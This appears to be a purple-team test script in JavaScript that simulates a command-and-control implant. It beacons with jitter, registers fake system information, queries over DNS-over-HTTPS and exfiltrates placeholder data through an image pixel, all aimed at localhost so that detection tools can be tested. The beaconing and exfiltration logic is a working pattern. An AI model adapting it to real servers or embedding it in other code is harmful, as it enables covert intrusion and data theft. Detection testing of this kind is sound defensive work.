/**
 * PURPLE TEAM TEST ARTIFACT - SAMPLE 5
 * Name: Command & Control Beacon Simulation
 * Purpose: Tests detection of JS-based C2 implants that beacon out, 
 *          poll for commands, use DNS-over-HTTPS for lookups, 
 *          and exfiltrate via steganography-like patterns.
 * Risk: NONE - All C2 endpoints are localhost. No real commands executed.
 * MITRE: T1071.001 (Web Protocols), T1132 (Data Encoding), T1573 (Encrypted Channel)
 * 
 * Expected detections:
 *   - Proxy/SWG: Periodic beaconing pattern, suspicious POST intervals
 *   - NDR: Regular interval HTTP callbacks (beacon jitter detection)
 *   - EDR: Script-based network callbacks matching C2 profile
 *   - SIEM: Correlation of repeated outbound connections at regular intervals
 */

(function() {
    'use strict';

    // --- Implant configuration (mimics real JS-based C2 stagers) ---
    var C2 = {
        primary: 'http://127.0.0.1:65535/api/v1/tasks',
        fallback: 'http://127.0.0.1:65534/api/v1/tasks',
        dns_over_https: 'https://127.0.0.1:65535/dns-query',
        implant_id: 'PT-' + Math.random().toString(36).substr(2, 12).toUpperCase(),
        beacon_interval: 5000,  // 5 seconds (real implants use 30-300s)
        jitter: 0.2,           // 20% jitter
        max_beacons: 5,
        encoding: 'base64',
        user_agent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) PurpleTeamTest/1.0'
    };

    var _beacon_seq = 0;
    var _c2_active = true;
    var _command_queue = [];

    // --- Helper: Add jitter to interval ---
    function jitteredInterval(base, jitter_pct) {
        var jitter = base * jitter_pct;
        return base + (Math.random() * jitter * 2 - jitter);
    }

    // --- Helper: Encode data (mimics real C2 encoding) ---
    function encodePayload(data) {
        var json = JSON.stringify(data);
        if (typeof btoa !== 'undefined') {
            return btoa(json);
        }
        return Buffer.from(json).toString('base64');
    }

    // --- System info collection (sent in first beacon as registration) ---
    var _sysinfo = {
        hostname: 'PURPLETEAM-WORKSTATION',
        os: (typeof navigator !== 'undefined') ? navigator.platform : 'unknown',
        user: 'pt-tester',
        pid: Math.floor(Math.random() * 65535),
        arch: 'x64',
        integrity: 'medium',
        domain: 'PURPLETEAM.LOCAL',
        internal_ip: '10.0.0.' + Math.floor(Math.random() * 254 + 1),
        implant_version: '1.0.0-purple-test'
    };

    // --- Beacon function ---
    function beacon() {
        if (!_c2_active) return;
        _beacon_seq++;

        var payload = {
            id: C2.implant_id,
            seq: _beacon_seq,
            type: _beacon_seq === 1 ? 'register' : 'checkin',
            sysinfo: _beacon_seq === 1 ? _sysinfo : undefined,
            timestamp: new Date().toISOString(),
            pending_results: _command_queue.length,
            note: 'PURPLE_TEAM_TEST_ARTIFACT_BENIGN'
        };

        var encoded = encodePayload(payload);

        // Primary C2 channel
        try {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', C2.primary, true);
            xhr.setRequestHeader('Content-Type', 'application/octet-stream');
            xhr.setRequestHeader('X-Request-ID', C2.implant_id);
            xhr.setRequestHeader('Cookie', 'session=' + encoded.substr(0, 32));
            xhr.timeout = 3000;

            xhr.onload = function() {
                console.log('[PURPLE TEAM] C2 beacon #' + _beacon_seq + ' response received (unlikely on localhost).');
            };

            xhr.onerror = function() {
                console.log('[PURPLE TEAM] C2 primary channel failed (expected). Would try fallback.');
            };

            xhr.send(encoded);
            console.log('[PURPLE TEAM] Beacon #' + _beacon_seq + ' sent. Encoded length: ' + encoded.length);
        } catch(e) {
            console.log('[PURPLE TEAM] Beacon failed: ' + e.message);
        }

        // --- Simulated DNS-over-HTTPS C2 channel (backup exfil) ---
        if (_beacon_seq === 2) {
            try {
                var doh_query = C2.implant_id.toLowerCase() + '.c2.purpleteam.test';
                fetch(C2.dns_over_https + '?name=' + doh_query + '&type=TXT', {
                    headers: { 'Accept': 'application/dns-json' }
                }).then(function() {
                    console.log('[PURPLE TEAM] DoH query sent (will fail).');
                }).catch(function() {
                    console.log('[PURPLE TEAM] DoH channel failed (expected).');
                });
            } catch(e) {}
        }

        // --- Simulated data exfiltration via query parameters ---
        if (_beacon_seq === 3) {
            try {
                var exfil_data = encodePayload({
                    type: 'exfil_test',
                    data: 'PURPLE_TEAM_FAKE_SENSITIVE_DATA_NOT_REAL',
                    size_kb: 0
                });
                // Chunked exfil via GET parameters (mimics real technique)
                var img = new Image();
                img.src = 'http://127.0.0.1:65535/pixel.gif?d=' + encodeURIComponent(exfil_data.substr(0, 100));
                console.log('[PURPLE TEAM] Image beacon exfil attempt (benign, localhost).');
            } catch(e) {}
        }

        // Continue beaconing or stop
        if (_beacon_seq >= C2.max_beacons) {
            _c2_active = false;
            console.log('[PURPLE TEAM] Max beacons reached (' + C2.max_beacons + '). Implant simulation complete.');
        } else {
            var next_interval = jitteredInterval(C2.beacon_interval, C2.jitter);
            console.log('[PURPLE TEAM] Next beacon in ' + Math.round(next_interval) + 'ms (with jitter).');
            setTimeout(beacon, next_interval);
        }
    }

    // --- Simulated persistence check (real implants verify they survive restarts) ---
    console.log('[PURPLE TEAM] Checking persistence mechanisms (all simulated, nothing installed):');
    console.log('[PURPLE TEAM]   - localStorage key: ' + (typeof localStorage !== 'undefined' ? 'available' : 'unavailable'));
    console.log('[PURPLE TEAM]   - ServiceWorker: ' + (typeof navigator !== 'undefined' && 'serviceWorker' in navigator ? 'available' : 'unavailable'));
    console.log('[PURPLE TEAM]   - Web Notification: ' + (typeof Notification !== 'undefined' ? 'available' : 'unavailable'));
    console.log('[PURPLE TEAM]   - No persistence mechanisms were installed.');

    // --- Start beacon loop ---
    console.log('[PURPLE TEAM] Sample 5: C2 Beacon simulation starting');
    console.log('[PURPLE TEAM] Implant ID: ' + C2.implant_id);
    console.log('[PURPLE TEAM] C2 Primary: ' + C2.primary + ' (localhost - will fail)');
    console.log('[PURPLE TEAM] Beacon interval: ' + C2.beacon_interval + 'ms with ' + (C2.jitter * 100) + '% jitter');
    console.log('[PURPLE TEAM] Max beacons: ' + C2.max_beacons);

    beacon(); // First beacon immediately

})();
